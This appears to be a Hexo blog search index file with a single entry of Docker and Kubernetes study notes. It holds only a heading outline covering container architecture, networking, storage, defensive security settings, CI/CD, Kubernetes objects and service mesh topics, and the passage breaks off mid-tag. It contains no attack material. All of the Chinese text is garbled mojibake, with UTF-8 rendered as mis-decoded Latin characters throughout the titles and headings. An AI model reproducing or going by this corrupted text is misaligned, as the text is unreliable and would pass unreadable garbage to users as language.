<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Docker ä¸“é¢˜çŸ¥è¯†å­¦ä¹ </title>
    <link href="/2025/07/12/Docker%20Study%20Notes/"/>
    <url>/2025/07/12/Docker%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸€ã€Docker-åŸºç¡€ä¸æ ¸å¿ƒæ¦‚å¿µ"><a href="#ä¸€ã€Docker-åŸºç¡€ä¸æ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="ä¸€ã€Docker åŸºç¡€ä¸æ ¸å¿ƒæ¦‚å¿µ"></a>ä¸€ã€Docker åŸºç¡€ä¸æ ¸å¿ƒæ¦‚å¿µ</h1><h2 id="1-1-æ¶æ„è®¾è®¡ä¸å·¥ä½œåŸç†"><a href="#1-1-æ¶æ„è®¾è®¡ä¸å·¥ä½œåŸç†" class="headerlink" title="1.1 æ¶æ„è®¾è®¡ä¸å·¥ä½œåŸç†"></a>1.1 æ¶æ„è®¾è®¡ä¸å·¥ä½œåŸç†</h2><h3 id="1-1-1-Client-Server-æ¶æ„ï¼ˆDocker-Client-Daemon-REST-APIï¼‰"><a href="#1-1-1-Client-Server-æ¶æ„ï¼ˆDocker-Client-Daemon-REST-APIï¼‰" class="headerlink" title="1.1.1 Client-Server æ¶æ„ï¼ˆDocker Client&#x2F;Daemon&#x2F;REST APIï¼‰"></a>1.1.1 Client-Server æ¶æ„ï¼ˆDocker Client&#x2F;Daemon&#x2F;REST APIï¼‰</h3><h3 id="1-1-2-é•œåƒåˆ†å±‚å­˜å‚¨æœºåˆ¶ï¼ˆUnionFSï¼‰ä¸å†™æ—¶å¤åˆ¶ï¼ˆCopy-on-Writeï¼‰"><a href="#1-1-2-é•œåƒåˆ†å±‚å­˜å‚¨æœºåˆ¶ï¼ˆUnionFSï¼‰ä¸å†™æ—¶å¤åˆ¶ï¼ˆCopy-on-Writeï¼‰" class="headerlink" title="1.1.2 é•œåƒåˆ†å±‚å­˜å‚¨æœºåˆ¶ï¼ˆUnionFSï¼‰ä¸å†™æ—¶å¤åˆ¶ï¼ˆCopy-on-Writeï¼‰"></a>1.1.2 é•œåƒåˆ†å±‚å­˜å‚¨æœºåˆ¶ï¼ˆUnionFSï¼‰ä¸å†™æ—¶å¤åˆ¶ï¼ˆCopy-on-Writeï¼‰</h3><h3 id="1-1-3-Linux-Namespace-éš”ç¦»æœºåˆ¶ï¼ˆPID-Network-Mount-IPC-UTS-Userï¼‰"><a href="#1-1-3-Linux-Namespace-éš”ç¦»æœºåˆ¶ï¼ˆPID-Network-Mount-IPC-UTS-Userï¼‰" class="headerlink" title="1.1.3 Linux Namespace éš”ç¦»æœºåˆ¶ï¼ˆPID&#x2F;Network&#x2F;Mount&#x2F;IPC&#x2F;UTS&#x2F;Userï¼‰"></a>1.1.3 Linux Namespace éš”ç¦»æœºåˆ¶ï¼ˆPID&#x2F;Network&#x2F;Mount&#x2F;IPC&#x2F;UTS&#x2F;Userï¼‰</h3><h3 id="1-1-4-Cgroups-èµ„æºæ§åˆ¶ï¼ˆCPU-å†…å­˜-ç£ç›˜I-O-ç½‘ç»œï¼‰"><a href="#1-1-4-Cgroups-èµ„æºæ§åˆ¶ï¼ˆCPU-å†…å­˜-ç£ç›˜I-O-ç½‘ç»œï¼‰" class="headerlink" title="1.1.4 Cgroups èµ„æºæ§åˆ¶ï¼ˆCPU&#x2F;å†…å­˜&#x2F;ç£ç›˜I&#x2F;O&#x2F;ç½‘ç»œï¼‰"></a>1.1.4 Cgroups èµ„æºæ§åˆ¶ï¼ˆCPU&#x2F;å†…å­˜&#x2F;ç£ç›˜I&#x2F;O&#x2F;ç½‘ç»œï¼‰</h3><h2 id="1-2-é•œåƒç®¡ç†"><a href="#1-2-é•œåƒç®¡ç†" class="headerlink" title="1.2 é•œåƒç®¡ç†"></a>1.2 é•œåƒç®¡ç†</h2><h3 id="1-2-1-Dockerfile-æŒ‡ä»¤è¯¦è§£ï¼ˆFROM-COPY-RUN-CMD-ENTRYPOINTï¼‰"><a href="#1-2-1-Dockerfile-æŒ‡ä»¤è¯¦è§£ï¼ˆFROM-COPY-RUN-CMD-ENTRYPOINTï¼‰" class="headerlink" title="1.2.1 Dockerfile æŒ‡ä»¤è¯¦è§£ï¼ˆFROM&#x2F;COPY&#x2F;RUN&#x2F;CMD&#x2F;ENTRYPOINTï¼‰"></a>1.2.1 Dockerfile æŒ‡ä»¤è¯¦è§£ï¼ˆFROM&#x2F;COPY&#x2F;RUN&#x2F;CMD&#x2F;ENTRYPOINTï¼‰</h3><h3 id="1-2-2-é•œåƒæ„å»ºä¼˜åŒ–ç­–ç•¥ï¼ˆå¤šé˜¶æ®µæ„å»º-å±‚ç¼“å­˜ï¼‰"><a href="#1-2-2-é•œåƒæ„å»ºä¼˜åŒ–ç­–ç•¥ï¼ˆå¤šé˜¶æ®µæ„å»º-å±‚ç¼“å­˜ï¼‰" class="headerlink" title="1.2.2 é•œåƒæ„å»ºä¼˜åŒ–ç­–ç•¥ï¼ˆå¤šé˜¶æ®µæ„å»º&#x2F;å±‚ç¼“å­˜ï¼‰"></a>1.2.2 é•œåƒæ„å»ºä¼˜åŒ–ç­–ç•¥ï¼ˆå¤šé˜¶æ®µæ„å»º&#x2F;å±‚ç¼“å­˜ï¼‰</h3><h3 id="1-2-3-é•œåƒä»“åº“ç®¡ç†ï¼ˆDocker-Hub-ç§æœ‰Registry-é•œåƒå®‰å…¨æ‰«æï¼‰"><a href="#1-2-3-é•œåƒä»“åº“ç®¡ç†ï¼ˆDocker-Hub-ç§æœ‰Registry-é•œåƒå®‰å…¨æ‰«æï¼‰" class="headerlink" title="1.2.3 é•œåƒä»“åº“ç®¡ç†ï¼ˆDocker Hub&#x2F;ç§æœ‰Registry&#x2F;é•œåƒå®‰å…¨æ‰«æï¼‰"></a>1.2.3 é•œåƒä»“åº“ç®¡ç†ï¼ˆDocker Hub&#x2F;ç§æœ‰Registry&#x2F;é•œåƒå®‰å…¨æ‰«æï¼‰</h3><h2 id="1-3-å®¹å™¨ç”Ÿå‘½å‘¨æœŸç®¡ç†"><a href="#1-3-å®¹å™¨ç”Ÿå‘½å‘¨æœŸç®¡ç†" class="headerlink" title="1.3 å®¹å™¨ç”Ÿå‘½å‘¨æœŸç®¡ç†"></a>1.3 å®¹å™¨ç”Ÿå‘½å‘¨æœŸç®¡ç†</h2><h3 id="1-3-1-å®¹å™¨æ“ä½œå‘½ä»¤ï¼ˆrun-exec-stop-rm-logsï¼‰"><a href="#1-3-1-å®¹å™¨æ“ä½œå‘½ä»¤ï¼ˆrun-exec-stop-rm-logsï¼‰" class="headerlink" title="1.3.1 å®¹å™¨æ“ä½œå‘½ä»¤ï¼ˆrun&#x2F;exec&#x2F;stop&#x2F;rm&#x2F;logsï¼‰"></a>1.3.1 å®¹å™¨æ“ä½œå‘½ä»¤ï¼ˆrun&#x2F;exec&#x2F;stop&#x2F;rm&#x2F;logsï¼‰</h3><h3 id="1-3-2-èµ„æºé™åˆ¶é…ç½®ï¼ˆCPU-å†…å­˜-ç£ç›˜IOï¼‰"><a href="#1-3-2-èµ„æºé™åˆ¶é…ç½®ï¼ˆCPU-å†…å­˜-ç£ç›˜IOï¼‰" class="headerlink" title="1.3.2 èµ„æºé™åˆ¶é…ç½®ï¼ˆCPU&#x2F;å†…å­˜&#x2F;ç£ç›˜IOï¼‰"></a>1.3.2 èµ„æºé™åˆ¶é…ç½®ï¼ˆCPU&#x2F;å†…å­˜&#x2F;ç£ç›˜IOï¼‰</h3><h3 id="1-3-3-å®¹å™¨å¥åº·æ£€æŸ¥ä¸è‡ªæ„ˆæœºåˆ¶"><a href="#1-3-3-å®¹å™¨å¥åº·æ£€æŸ¥ä¸è‡ªæ„ˆæœºåˆ¶" class="headerlink" title="1.3.3 å®¹å™¨å¥åº·æ£€æŸ¥ä¸è‡ªæ„ˆæœºåˆ¶"></a>1.3.3 å®¹å™¨å¥åº·æ£€æŸ¥ä¸è‡ªæ„ˆæœºåˆ¶</h3><h1 id="äºŒã€Docker-é«˜çº§ç‰¹æ€§"><a href="#äºŒã€Docker-é«˜çº§ç‰¹æ€§" class="headerlink" title="äºŒã€Docker é«˜çº§ç‰¹æ€§"></a>äºŒã€Docker é«˜çº§ç‰¹æ€§</h1><h2 id="2-1-ç½‘ç»œæ¨¡å‹"><a href="#2-1-ç½‘ç»œæ¨¡å‹" class="headerlink" title="2.1 ç½‘ç»œæ¨¡å‹"></a>2.1 ç½‘ç»œæ¨¡å‹</h2><h3 id="2-1-1-äº”ç§ç½‘ç»œæ¨¡å¼ï¼ˆnone-host-bridge-container-overlayï¼‰"><a href="#2-1-1-äº”ç§ç½‘ç»œæ¨¡å¼ï¼ˆnone-host-bridge-container-overlayï¼‰" class="headerlink" title="2.1.1 äº”ç§ç½‘ç»œæ¨¡å¼ï¼ˆnone&#x2F;host&#x2F;bridge&#x2F;container&#x2F;overlayï¼‰"></a>2.1.1 äº”ç§ç½‘ç»œæ¨¡å¼ï¼ˆnone&#x2F;host&#x2F;bridge&#x2F;container&#x2F;overlayï¼‰</h3><h3 id="2-1-2-è‡ªå®šä¹‰ç½‘ç»œä¸DNSæœåŠ¡å‘ç°"><a href="#2-1-2-è‡ªå®šä¹‰ç½‘ç»œä¸DNSæœåŠ¡å‘ç°" class="headerlink" title="2.1.2 è‡ªå®šä¹‰ç½‘ç»œä¸DNSæœåŠ¡å‘ç°"></a>2.1.2 è‡ªå®šä¹‰ç½‘ç»œä¸DNSæœåŠ¡å‘ç°</h3><h3 id="2-1-3-å®¹å™¨ç½‘ç»œäº’é€šä¸è·¨ä¸»æœºé€šä¿¡"><a href="#2-1-3-å®¹å™¨ç½‘ç»œäº’é€šä¸è·¨ä¸»æœºé€šä¿¡" class="headerlink" title="2.1.3 å®¹å™¨ç½‘ç»œäº’é€šä¸è·¨ä¸»æœºé€šä¿¡"></a>2.1.3 å®¹å™¨ç½‘ç»œäº’é€šä¸è·¨ä¸»æœºé€šä¿¡</h3><h2 id="2-2-å­˜å‚¨ç®¡ç†"><a href="#2-2-å­˜å‚¨ç®¡ç†" class="headerlink" title="2.2 å­˜å‚¨ç®¡ç†"></a>2.2 å­˜å‚¨ç®¡ç†</h2><h3 id="2-2-1-æ•°æ®å·ï¼ˆVolumeï¼‰ä¸ç»‘å®šæŒ‚è½½ï¼ˆBind-Mountï¼‰"><a href="#2-2-1-æ•°æ®å·ï¼ˆVolumeï¼‰ä¸ç»‘å®šæŒ‚è½½ï¼ˆBind-Mountï¼‰" class="headerlink" title="2.2.1 æ•°æ®å·ï¼ˆVolumeï¼‰ä¸ç»‘å®šæŒ‚è½½ï¼ˆBind Mountï¼‰"></a>2.2.1 æ•°æ®å·ï¼ˆVolumeï¼‰ä¸ç»‘å®šæŒ‚è½½ï¼ˆBind Mountï¼‰</h3><h3 id="2-2-2-æŒä¹…åŒ–å­˜å‚¨æ–¹æ¡ˆï¼ˆNFS-äº‘å­˜å‚¨æ’ä»¶ï¼‰"><a href="#2-2-2-æŒä¹…åŒ–å­˜å‚¨æ–¹æ¡ˆï¼ˆNFS-äº‘å­˜å‚¨æ’ä»¶ï¼‰" class="headerlink" title="2.2.2 æŒä¹…åŒ–å­˜å‚¨æ–¹æ¡ˆï¼ˆNFS&#x2F;äº‘å­˜å‚¨æ’ä»¶ï¼‰"></a>2.2.2 æŒä¹…åŒ–å­˜å‚¨æ–¹æ¡ˆï¼ˆNFS&#x2F;äº‘å­˜å‚¨æ’ä»¶ï¼‰</h3><h3 id="2-2-3-å­˜å‚¨é©±åŠ¨é€‰æ‹©ä¸æ€§èƒ½ä¼˜åŒ–"><a href="#2-2-3-å­˜å‚¨é©±åŠ¨é€‰æ‹©ä¸æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="2.2.3 å­˜å‚¨é©±åŠ¨é€‰æ‹©ä¸æ€§èƒ½ä¼˜åŒ–"></a>2.2.3 å­˜å‚¨é©±åŠ¨é€‰æ‹©ä¸æ€§èƒ½ä¼˜åŒ–</h3><h2 id="2-3-å®‰å…¨æœºåˆ¶"><a href="#2-3-å®‰å…¨æœºåˆ¶" class="headerlink" title="2.3 å®‰å…¨æœºåˆ¶"></a>2.3 å®‰å…¨æœºåˆ¶</h2><h3 id="2-3-1-èƒ½åŠ›æ§åˆ¶ï¼ˆCapabilitiesï¼‰ä¸Seccompé…ç½®æ–‡ä»¶"><a href="#2-3-1-èƒ½åŠ›æ§åˆ¶ï¼ˆCapabilitiesï¼‰ä¸Seccompé…ç½®æ–‡ä»¶" class="headerlink" title="2.3.1 èƒ½åŠ›æ§åˆ¶ï¼ˆCapabilitiesï¼‰ä¸Seccompé…ç½®æ–‡ä»¶"></a>2.3.1 èƒ½åŠ›æ§åˆ¶ï¼ˆCapabilitiesï¼‰ä¸Seccompé…ç½®æ–‡ä»¶</h3><h3 id="2-3-2-é•œåƒç­¾åéªŒè¯ï¼ˆDocker-Content-Trustï¼‰"><a href="#2-3-2-é•œåƒç­¾åéªŒè¯ï¼ˆDocker-Content-Trustï¼‰" class="headerlink" title="2.3.2 é•œåƒç­¾åéªŒè¯ï¼ˆDocker Content Trustï¼‰"></a>2.3.2 é•œåƒç­¾åéªŒè¯ï¼ˆDocker Content Trustï¼‰</h3><h3 id="2-3-3-å®¹å™¨å®‰å…¨æœ€ä½³å®è·µï¼ˆérootç”¨æˆ·-åªè¯»æ–‡ä»¶ç³»ç»Ÿï¼‰"><a href="#2-3-3-å®¹å™¨å®‰å…¨æœ€ä½³å®è·µï¼ˆérootç”¨æˆ·-åªè¯»æ–‡ä»¶ç³»ç»Ÿï¼‰" class="headerlink" title="2.3.3 å®¹å™¨å®‰å…¨æœ€ä½³å®è·µï¼ˆérootç”¨æˆ·&#x2F;åªè¯»æ–‡ä»¶ç³»ç»Ÿï¼‰"></a>2.3.3 å®¹å™¨å®‰å…¨æœ€ä½³å®è·µï¼ˆérootç”¨æˆ·&#x2F;åªè¯»æ–‡ä»¶ç³»ç»Ÿï¼‰</h3><h1 id="ä¸‰ã€Docker-å®æˆ˜ä¸å·¥ç¨‹åŒ–"><a href="#ä¸‰ã€Docker-å®æˆ˜ä¸å·¥ç¨‹åŒ–" class="headerlink" title="ä¸‰ã€Docker å®æˆ˜ä¸å·¥ç¨‹åŒ–"></a>ä¸‰ã€Docker å®æˆ˜ä¸å·¥ç¨‹åŒ–</h1><h2 id="3-1-ç”Ÿäº§ç¯å¢ƒä¼˜åŒ–"><a href="#3-1-ç”Ÿäº§ç¯å¢ƒä¼˜åŒ–" class="headerlink" title="3.1 ç”Ÿäº§ç¯å¢ƒä¼˜åŒ–"></a>3.1 ç”Ÿäº§ç¯å¢ƒä¼˜åŒ–</h2><h3 id="3-1-1-å¤šé˜¶æ®µæ„å»ºå®æˆ˜ï¼ˆGo-Node-js-Pythoné¡¹ç›®ï¼‰"><a href="#3-1-1-å¤šé˜¶æ®µæ„å»ºå®æˆ˜ï¼ˆGo-Node-js-Pythoné¡¹ç›®ï¼‰" class="headerlink" title="3.1.1 å¤šé˜¶æ®µæ„å»ºå®æˆ˜ï¼ˆGo&#x2F;Node.js&#x2F;Pythoné¡¹ç›®ï¼‰"></a>3.1.1 å¤šé˜¶æ®µæ„å»ºå®æˆ˜ï¼ˆGo&#x2F;Node.js&#x2F;Pythoné¡¹ç›®ï¼‰</h3><h3 id="3-1-2-æœ€å°åŒ–é•œåƒæ„å»ºï¼ˆAlpine-Distrolessï¼‰"><a href="#3-1-2-æœ€å°åŒ–é•œåƒæ„å»ºï¼ˆAlpine-Distrolessï¼‰" class="headerlink" title="3.1.2 æœ€å°åŒ–é•œåƒæ„å»ºï¼ˆAlpine&#x2F;Distrolessï¼‰"></a>3.1.2 æœ€å°åŒ–é•œåƒæ„å»ºï¼ˆAlpine&#x2F;Distrolessï¼‰</h3><h3 id="3-1-3-å®¹å™¨èµ„æºç›‘æ§æ–¹æ¡ˆï¼ˆcAdvisor-Prometheusï¼‰"><a href="#3-1-3-å®¹å™¨èµ„æºç›‘æ§æ–¹æ¡ˆï¼ˆcAdvisor-Prometheusï¼‰" class="headerlink" title="3.1.3 å®¹å™¨èµ„æºç›‘æ§æ–¹æ¡ˆï¼ˆcAdvisor&#x2F;Prometheusï¼‰"></a>3.1.3 å®¹å™¨èµ„æºç›‘æ§æ–¹æ¡ˆï¼ˆcAdvisor&#x2F;Prometheusï¼‰</h3><h2 id="3-2-CI-CD-é›†æˆ"><a href="#3-2-CI-CD-é›†æˆ" class="headerlink" title="3.2 CI&#x2F;CD é›†æˆ"></a>3.2 CI&#x2F;CD é›†æˆ</h2><h3 id="3-2-1-Jenkins-å®¹å™¨åŒ–æµæ°´çº¿è®¾è®¡"><a href="#3-2-1-Jenkins-å®¹å™¨åŒ–æµæ°´çº¿è®¾è®¡" class="headerlink" title="3.2.1 Jenkins å®¹å™¨åŒ–æµæ°´çº¿è®¾è®¡"></a>3.2.1 Jenkins å®¹å™¨åŒ–æµæ°´çº¿è®¾è®¡</h3><h3 id="3-2-2-GitLab-CI-CD-å®¹å™¨é›†æˆ"><a href="#3-2-2-GitLab-CI-CD-å®¹å™¨é›†æˆ" class="headerlink" title="3.2.2 GitLab CI&#x2F;CD å®¹å™¨é›†æˆ"></a>3.2.2 GitLab CI&#x2F;CD å®¹å™¨é›†æˆ</h3><h3 id="3-2-3-é•œåƒä»“åº“ä¸éƒ¨ç½²è‡ªåŠ¨åŒ–ç­–ç•¥"><a href="#3-2-3-é•œåƒä»“åº“ä¸éƒ¨ç½²è‡ªåŠ¨åŒ–ç­–ç•¥" class="headerlink" title="3.2.3 é•œåƒä»“åº“ä¸éƒ¨ç½²è‡ªåŠ¨åŒ–ç­–ç•¥"></a>3.2.3 é•œåƒä»“åº“ä¸éƒ¨ç½²è‡ªåŠ¨åŒ–ç­–ç•¥</h3><h1 id="å››ã€Kubernetes-åŸºç¡€æ¶æ„"><a href="#å››ã€Kubernetes-åŸºç¡€æ¶æ„" class="headerlink" title="å››ã€Kubernetes åŸºç¡€æ¶æ„"></a>å››ã€Kubernetes åŸºç¡€æ¶æ„</h1><h2 id="4-1-æ ¸å¿ƒç»„ä»¶æ¶æ„"><a href="#4-1-æ ¸å¿ƒç»„ä»¶æ¶æ„" class="headerlink" title="4.1 æ ¸å¿ƒç»„ä»¶æ¶æ„"></a>4.1 æ ¸å¿ƒç»„ä»¶æ¶æ„</h2><h3 id="4-1-1-æ§åˆ¶å¹³é¢ç»„ä»¶ï¼ˆAPI-Server-etcd-Schedulerï¼‰"><a href="#4-1-1-æ§åˆ¶å¹³é¢ç»„ä»¶ï¼ˆAPI-Server-etcd-Schedulerï¼‰" class="headerlink" title="4.1.1 æ§åˆ¶å¹³é¢ç»„ä»¶ï¼ˆAPI Server&#x2F;etcd&#x2F;Schedulerï¼‰"></a>4.1.1 æ§åˆ¶å¹³é¢ç»„ä»¶ï¼ˆAPI Server&#x2F;etcd&#x2F;Schedulerï¼‰</h3><h3 id="4-1-2-å·¥ä½œèŠ‚ç‚¹ç»„ä»¶ï¼ˆKubelet-kube-proxy-å®¹å™¨è¿è¡Œæ—¶ï¼‰"><a href="#4-1-2-å·¥ä½œèŠ‚ç‚¹ç»„ä»¶ï¼ˆKubelet-kube-proxy-å®¹å™¨è¿è¡Œæ—¶ï¼‰" class="headerlink" title="4.1.2 å·¥ä½œèŠ‚ç‚¹ç»„ä»¶ï¼ˆKubelet&#x2F;kube-proxy&#x2F;å®¹å™¨è¿è¡Œæ—¶ï¼‰"></a>4.1.2 å·¥ä½œèŠ‚ç‚¹ç»„ä»¶ï¼ˆKubelet&#x2F;kube-proxy&#x2F;å®¹å™¨è¿è¡Œæ—¶ï¼‰</h3><h3 id="4-1-3-é›†ç¾¤é€šä¿¡æœºåˆ¶ï¼ˆAPI-èšåˆ-CRI-CNI-CSIï¼‰"><a href="#4-1-3-é›†ç¾¤é€šä¿¡æœºåˆ¶ï¼ˆAPI-èšåˆ-CRI-CNI-CSIï¼‰" class="headerlink" title="4.1.3 é›†ç¾¤é€šä¿¡æœºåˆ¶ï¼ˆAPI èšåˆ&#x2F;CRI&#x2F;CNI&#x2F;CSIï¼‰"></a>4.1.3 é›†ç¾¤é€šä¿¡æœºåˆ¶ï¼ˆAPI èšåˆ&#x2F;CRI&#x2F;CNI&#x2F;CSIï¼‰</h3><h2 id="4-2-æ ¸å¿ƒå¯¹è±¡æ¨¡å‹"><a href="#4-2-æ ¸å¿ƒå¯¹è±¡æ¨¡å‹" class="headerlink" title="4.2 æ ¸å¿ƒå¯¹è±¡æ¨¡å‹"></a>4.2 æ ¸å¿ƒå¯¹è±¡æ¨¡å‹</h2><h3 id="4-2-1-Pod-å·¥ä½œåŸç†ä¸ç”Ÿå‘½å‘¨æœŸ"><a href="#4-2-1-Pod-å·¥ä½œåŸç†ä¸ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="4.2.1 Pod å·¥ä½œåŸç†ä¸ç”Ÿå‘½å‘¨æœŸ"></a>4.2.1 Pod å·¥ä½œåŸç†ä¸ç”Ÿå‘½å‘¨æœŸ</h3><h3 id="4-2-2-Deployment-æ— çŠ¶æ€åº”ç”¨ç®¡ç†"><a href="#4-2-2-Deployment-æ— çŠ¶æ€åº”ç”¨ç®¡ç†" class="headerlink" title="4.2.2 Deployment æ— çŠ¶æ€åº”ç”¨ç®¡ç†"></a>4.2.2 Deployment æ— çŠ¶æ€åº”ç”¨ç®¡ç†</h3><h3 id="4-2-3-Service-æœåŠ¡å‘ç°ä¸è´Ÿè½½å‡è¡¡"><a href="#4-2-3-Service-æœåŠ¡å‘ç°ä¸è´Ÿè½½å‡è¡¡" class="headerlink" title="4.2.3 Service æœåŠ¡å‘ç°ä¸è´Ÿè½½å‡è¡¡"></a>4.2.3 Service æœåŠ¡å‘ç°ä¸è´Ÿè½½å‡è¡¡</h3><h1 id="äº”ã€Kubernetes-è¿›é˜¶å®è·µ"><a href="#äº”ã€Kubernetes-è¿›é˜¶å®è·µ" class="headerlink" title="äº”ã€Kubernetes è¿›é˜¶å®è·µ"></a>äº”ã€Kubernetes è¿›é˜¶å®è·µ</h1><h2 id="5-1-ç½‘ç»œä¸å­˜å‚¨"><a href="#5-1-ç½‘ç»œä¸å­˜å‚¨" class="headerlink" title="5.1 ç½‘ç»œä¸å­˜å‚¨"></a>5.1 ç½‘ç»œä¸å­˜å‚¨</h2><h3 id="5-1-1-Ingress-æ§åˆ¶å™¨ï¼ˆNginx-Traefikï¼‰é…ç½®"><a href="#5-1-1-Ingress-æ§åˆ¶å™¨ï¼ˆNginx-Traefikï¼‰é…ç½®" class="headerlink" title="5.1.1 Ingress æ§åˆ¶å™¨ï¼ˆNginx&#x2F;Traefikï¼‰é…ç½®"></a>5.1.1 Ingress æ§åˆ¶å™¨ï¼ˆNginx&#x2F;Traefikï¼‰é…ç½®</h3><h3 id="5-1-2-CNI-ç½‘ç»œæ’ä»¶ï¼ˆCalico-Flannel-Ciliumï¼‰"><a href="#5-1-2-CNI-ç½‘ç»œæ’ä»¶ï¼ˆCalico-Flannel-Ciliumï¼‰" class="headerlink" title="5.1.2 CNI ç½‘ç»œæ’ä»¶ï¼ˆCalico&#x2F;Flannel&#x2F;Ciliumï¼‰"></a>5.1.2 CNI ç½‘ç»œæ’ä»¶ï¼ˆCalico&#x2F;Flannel&#x2F;Ciliumï¼‰</h3><h3 id="5-1-3-PV-PVC-å­˜å‚¨ç®¡ç†ï¼ˆLocal-NFS-äº‘å­˜å‚¨ï¼‰"><a href="#5-1-3-PV-PVC-å­˜å‚¨ç®¡ç†ï¼ˆLocal-NFS-äº‘å­˜å‚¨ï¼‰" class="headerlink" title="5.1.3 PV&#x2F;PVC å­˜å‚¨ç®¡ç†ï¼ˆLocal&#x2F;NFS&#x2F;äº‘å­˜å‚¨ï¼‰"></a>5.1.3 PV&#x2F;PVC å­˜å‚¨ç®¡ç†ï¼ˆLocal&#x2F;NFS&#x2F;äº‘å­˜å‚¨ï¼‰</h3><h2 id="5-2-é…ç½®ä¸å®‰å…¨ç®¡ç†"><a href="#5-2-é…ç½®ä¸å®‰å…¨ç®¡ç†" class="headerlink" title="5.2 é…ç½®ä¸å®‰å…¨ç®¡ç†"></a>5.2 é…ç½®ä¸å®‰å…¨ç®¡ç†</h2><h3 id="5-2-1-ConfigMap-ä¸-Secret-ç®¡ç†"><a href="#5-2-1-ConfigMap-ä¸-Secret-ç®¡ç†" class="headerlink" title="5.2.1 ConfigMap ä¸ Secret ç®¡ç†"></a>5.2.1 ConfigMap ä¸ Secret ç®¡ç†</h3><h3 id="5-2-2-RBAC-æƒé™æ§åˆ¶ç³»ç»Ÿ"><a href="#5-2-2-RBAC-æƒé™æ§åˆ¶ç³»ç»Ÿ" class="headerlink" title="5.2.2 RBAC æƒé™æ§åˆ¶ç³»ç»Ÿ"></a>5.2.2 RBAC æƒé™æ§åˆ¶ç³»ç»Ÿ</h3><h3 id="5-2-3-ç½‘ç»œç­–ç•¥ï¼ˆNetworkPolicyï¼‰å®æ–½"><a href="#5-2-3-ç½‘ç»œç­–ç•¥ï¼ˆNetworkPolicyï¼‰å®æ–½" class="headerlink" title="5.2.3 ç½‘ç»œç­–ç•¥ï¼ˆNetworkPolicyï¼‰å®æ–½"></a>5.2.3 ç½‘ç»œç­–ç•¥ï¼ˆNetworkPolicyï¼‰å®æ–½</h3><h2 id="5-3-è¿ç»´ä¸ç›‘æ§"><a href="#5-3-è¿ç»´ä¸ç›‘æ§" class="headerlink" title="5.3 è¿ç»´ä¸ç›‘æ§"></a>5.3 è¿ç»´ä¸ç›‘æ§</h2><h3 id="5-3-1-HPA-è‡ªåŠ¨æ‰©ç¼©å®¹æœºåˆ¶"><a href="#5-3-1-HPA-è‡ªåŠ¨æ‰©ç¼©å®¹æœºåˆ¶" class="headerlink" title="5.3.1 HPA è‡ªåŠ¨æ‰©ç¼©å®¹æœºåˆ¶"></a>5.3.1 HPA è‡ªåŠ¨æ‰©ç¼©å®¹æœºåˆ¶</h3><h3 id="5-3-2-æ—¥å¿—æ”¶é›†æ¶æ„ï¼ˆEFK-Lokiï¼‰"><a href="#5-3-2-æ—¥å¿—æ”¶é›†æ¶æ„ï¼ˆEFK-Lokiï¼‰" class="headerlink" title="5.3.2 æ—¥å¿—æ”¶é›†æ¶æ„ï¼ˆEFK&#x2F;Lokiï¼‰"></a>5.3.2 æ—¥å¿—æ”¶é›†æ¶æ„ï¼ˆEFK&#x2F;Lokiï¼‰</h3><h3 id="5-3-3-ç›‘æ§ä½“ç³»ï¼ˆPrometheus-Grafanaï¼‰"><a href="#5-3-3-ç›‘æ§ä½“ç³»ï¼ˆPrometheus-Grafanaï¼‰" class="headerlink" title="5.3.3 ç›‘æ§ä½“ç³»ï¼ˆPrometheus+Grafanaï¼‰"></a>5.3.3 ç›‘æ§ä½“ç³»ï¼ˆPrometheus+Grafanaï¼‰</h3><h1 id="å…­ã€äº‘åŸç”ŸæŠ€æœ¯æ ˆ"><a href="#å…­ã€äº‘åŸç”ŸæŠ€æœ¯æ ˆ" class="headerlink" title="å…­ã€äº‘åŸç”ŸæŠ€æœ¯æ ˆ"></a>å…­ã€äº‘åŸç”ŸæŠ€æœ¯æ ˆ</h1><h2 id="6-1-é«˜çº§ç¼–æ’æ¨¡å¼"><a href="#6-1-é«˜çº§ç¼–æ’æ¨¡å¼" class="headerlink" title="6.1 é«˜çº§ç¼–æ’æ¨¡å¼"></a>6.1 é«˜çº§ç¼–æ’æ¨¡å¼</h2><h3 id="6-1-1-StatefulSet-æœ‰çŠ¶æ€åº”ç”¨ç®¡ç†"><a href="#6-1-1-StatefulSet-æœ‰çŠ¶æ€åº”ç”¨ç®¡ç†" class="headerlink" title="6.1.1 StatefulSet æœ‰çŠ¶æ€åº”ç”¨ç®¡ç†"></a>6.1.1 StatefulSet æœ‰çŠ¶æ€åº”ç”¨ç®¡ç†</h3><h3 id="6-1-2-DaemonSet-èŠ‚ç‚¹å®ˆæŠ¤æœåŠ¡"><a href="#6-1-2-DaemonSet-èŠ‚ç‚¹å®ˆæŠ¤æœåŠ¡" class="headerlink" title="6.1.2 DaemonSet èŠ‚ç‚¹å®ˆæŠ¤æœåŠ¡"></a>6.1.2 DaemonSet èŠ‚ç‚¹å®ˆæŠ¤æœåŠ¡</h3><h3 id="6-1-3-Operator-å¼€å‘æ¡†æ¶ï¼ˆKubeBuilder-Operator-SDKï¼‰"><a href="#6-1-3-Operator-å¼€å‘æ¡†æ¶ï¼ˆKubeBuilder-Operator-SDKï¼‰" class="headerlink" title="6.1.3 Operator å¼€å‘æ¡†æ¶ï¼ˆKubeBuilder&#x2F;Operator SDKï¼‰"></a>6.1.3 Operator å¼€å‘æ¡†æ¶ï¼ˆKubeBuilder&#x2F;Operator SDKï¼‰</h3><h2 id="6-2-æœåŠ¡ç½‘æ ¼"><a href="#6-2-æœåŠ¡ç½‘æ ¼" class="headerlink" title="6.2 æœåŠ¡ç½‘æ ¼"></a>6.2 æœåŠ¡ç½‘æ ¼</h2><h3 id="6-2-1-Istio-æ ¸å¿ƒæ¶æ„ï¼ˆPilot-Envoy-Mixerï¼‰"><a href="#6-2-1-Istio-æ ¸å¿ƒæ¶æ„ï¼ˆPilot-Envoy-Mixerï¼‰" class="headerlink" title="6.2.1 Istio æ ¸å¿ƒæ¶æ„ï¼ˆPilot&#x2F;Envoy&#x2F;Mixerï¼‰"></a>6.2.1 Istio æ ¸å¿ƒæ¶æ„ï¼ˆPilot&#x2F;Envoy&#x2F;Mixerï¼‰</h3><h3 id="6-2-2-æµé‡ç®¡ç†ï¼ˆé‡‘ä¸é›€å‘å¸ƒ-æ•…éšœæ³¨å…¥ï¼‰"><a 